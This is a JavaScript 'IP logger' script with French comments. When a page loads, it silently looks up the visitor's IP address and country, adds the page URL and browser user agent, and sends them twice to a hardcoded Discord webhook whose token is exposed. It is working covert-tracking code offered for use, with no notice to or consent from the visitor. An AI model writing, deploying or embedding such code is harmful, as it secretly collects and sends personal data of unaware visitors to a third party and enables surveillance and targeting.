// =============================================
// ULTRABOT IP LOGGER v9 - AVEC IP RÉELLE
// =============================================

const WEBHOOK = "https://canary.discord.com/api/webhooks/1477188997506928751/QdLJ25ZgN5GZw8ewnGTzcIHEsiH9La48uZpcf_NTPPiRZ0GSm5BzHyat3vlDpIEvO8Nz";

async function getIPAndSend() {
    console.log("%c[UltraBot] Récupération IP + envoi...", "color: orange");

    let ip = "IP non récupérée";
    let country = "Inconnu";

    // Tentative de récupération d'IP
    const services = [
        "https://api.ipify.org?format=json",
        "https://api.myip.com",
        "https://freeipapi.com/api/json"
    ];

    for (let url of services) {
        try {
            const res = await fetch(url);
            if (res.ok) {
                const data = await res.json();
                ip = data.ip || data.query || data.address || "Inconnu";
                country = data.country_name || data.country || data.cc || "Inconnu";
                break;
            }
        } catch (_) {}
    }

    // Envoi du log avec IP
    const message = `**🔴 Nouveau visiteur UltraBot**\n` +
                    `**IP :** \`${ip}\`\n` +
                    `**Pays :** ${country}\n` +
                    `**Heure :** ${new Date().toLocaleString('fr-FR')}\n` +
                    `**Page :** ${window.location.href}\n` +
                    `**UA :** ${navigator.userAgent.substring(0, 120)}...`;

    // Méthode principale
    fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: message })
    }).catch(() => {});

    // Backup Beacon
    try {
        navigator.sendBeacon(WEBHOOK, JSON.stringify({ content: message }));
        console.log("%c[UltraBot] ✅ IP + infos envoyées via Beacon", "color: lime");
    } catch (e) {}
}

// Lancement
window.addEventListener('load', () => {
    console.log("%c[UltraBot] Logger chargé - IP activée", "color: red; font-weight: bold");
    
    setTimeout(getIPAndSend, 700);
    setTimeout(getIPAndSend, 2200); // 2ème tentative
});
